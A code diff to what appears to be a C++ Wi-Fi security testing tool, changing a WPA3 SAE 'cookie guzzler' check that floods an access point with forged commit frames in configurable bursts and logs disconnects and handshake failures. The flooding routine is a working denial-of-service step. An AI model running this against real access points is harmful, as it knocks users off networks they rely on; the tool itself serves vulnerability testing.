@@ -55,12 +55,11 @@ RadioTap get_cookie_guzzler_frame(const HWAddress<6> &ap_mac, const HWAddress<6>
 }
 
 void check_vuln(const string &iface_name, const HWAddress<6> &ap_mac, const int attack_time,
-				const dos_helpers::SAEPair &sae_params, const string &att_mac
+				const dos_helpers::SAEPair &sae_params, const string &att_mac, const size_t burst_size
 ){
 	PacketSender sender(iface_name);
-
 	long long counter = 0;
-	long long next_log = 2000;
+	long long next_log = 0;
 
 	const auto end_time = steady_clock::now() + seconds(attack_time);
 	while(steady_clock::now() < end_time){
@@ -68,16 +67,15 @@ void check_vuln(const string &iface_name, const HWAddress<6> &ap_mac, const int 
 		auto cg_frame = get_cookie_guzzler_frame(ap_mac, sta_mac, sae_params);
 
 		//  burst of packet
-		constexpr size_t BURST_SIZE = 128;
-		for(size_t i = 0; i < BURST_SIZE; ++i){
+		for(size_t i = 0; i < burst_size; ++i){
 			sender.send(cg_frame);
 			this_thread::sleep_for(nanoseconds(100));
 		}
-		counter += BURST_SIZE;
+		counter += burst_size;
 
 		if(counter >= next_log){
 			log(LogLevel::DEBUG, "Packets sent: " + to_string(counter));
-			next_log += 20000;
+			next_log += 10*burst_size;
 		}
 	}
 	log(LogLevel::INFO, "Done. Total packets sent: " + to_string(counter));
@@ -99,10 +97,12 @@ void run_attack(RunStatus &rs){
 		// change to monitor mode
 		attacker->set_monitor_mode();
 		attacker->set_iface_up();
-		check_vuln(attacker["iface"], ap_mac, duration, sae_params.value(), attacker["mac"]);
+		check_vuln(attacker["iface"], ap_mac, duration, sae_params.value(), attacker["mac"],
+			att_cfg.at("burst_size").get<size_t>());
 	} else{
 		throw runtime_error("SAE Commit capture failed");
 	}
+	rs.process_manager.write_log_all("@END_of_attack");
 	const int regeneration_time_sec = att_cfg.at("regeneration_time_sec").get<int>();
 	this_thread::sleep_for(seconds(regeneration_time_sec));
 	ap->conn->disconnect();
@@ -111,6 +111,7 @@ void run_attack(RunStatus &rs){
 void stats_attack(const RunStatus &rs){
 	vector<unique_ptr<GraphElements>> elements;
 	rs.log_events(elements, {
+		{"access_point", "@END_of_attack", "END_of_attack", "yellow"},
 		{"access_point", "did not acknowledge", "ACK_fail", "red"},
 		{"client", "CTRL-EVENT-DISCONNECTED", "DISCONN", "red"},
 		{"access_point", "EAPOL-4WAY-HS-COMPLETED", "4Way", "green"},
